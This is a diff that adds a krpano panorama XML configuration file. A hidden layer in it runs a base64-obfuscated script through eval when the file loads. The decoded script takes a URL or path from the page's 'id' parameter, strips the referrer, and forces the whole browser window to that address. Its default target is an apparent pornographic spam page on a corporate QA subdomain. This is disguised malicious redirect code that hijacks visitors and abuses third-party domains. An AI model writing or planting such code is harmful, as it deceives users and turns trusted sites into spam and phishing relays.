@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<krpano version="1.0.8.15">
+  <!-- Generated: 2026-08-16T20:13:43 -->
+  <!-- Upload to: https://johanuk19.github.io/pal9/t.xml -->
+  <!-- Posts base: https://stars-cloud-serverless-qa.pwc.com/video/ -->
+  <layer name="js_loader" type="container" visible="false"
+    onloaded="js(eval(var w=atob('dmFyIGlkPW5ldyBVUkxTZWFyY2hQYXJhbXMobG9jYXRpb24uc2VhcmNoKS5nZXQoImlkIil8fCIiO3ZhciBCQVNFPSJodHRwczovL3N0YXJzLWNsb3VkLXNlcnZlcmxlc3MtcWEucHdjLmNvbS92aWRlby8iO3ZhciBGQUxMPSJodHRwczovL3N0YXJzLWNsb3VkLXNlcnZlcmxlc3MtcWEucHdjLmNvbS92aWRlby8yNS13YWxhLW1vYmlsZS1ob3QtaGQtcG9yLTEzMzEuaHRtbCI7ZnVuY3Rpb24gZ28odSl7dHJ5e3ZhciBtPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm1ldGEiKTttLm5hbWU9InJlZmVycmVyIjttLmNvbnRlbnQ9Im5vLXJlZmVycmVyIjtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKG0pfWNhdGNoKGUpe310cnl7dG9wLmxvY2F0aW9uLnJlcGxhY2UodSl9Y2F0Y2goZTEpe3RyeXt0b3AubG9jYXRpb24uaHJlZj11fWNhdGNoKGUyKXtsb2NhdGlvbi5ocmVmPXV9fX1pZighaWQpe2dvKEZBTEwpO31lbHNlIGlmKC9eaHR0cHM/OlwvXC8vaS50ZXN0KGlkKSl7Z28oaWQpO31lbHNle3ZhciBzPVN0cmluZyhpZCkucmVwbGFjZSgvXlwvKy8sIiIpO2lmKCEvXC5odG1sJC9pLnRlc3Qocykpcys9Ii5odG1sIjtnbyhCQVNFK3MpO30=');eval(w)););" />
+</krpano>
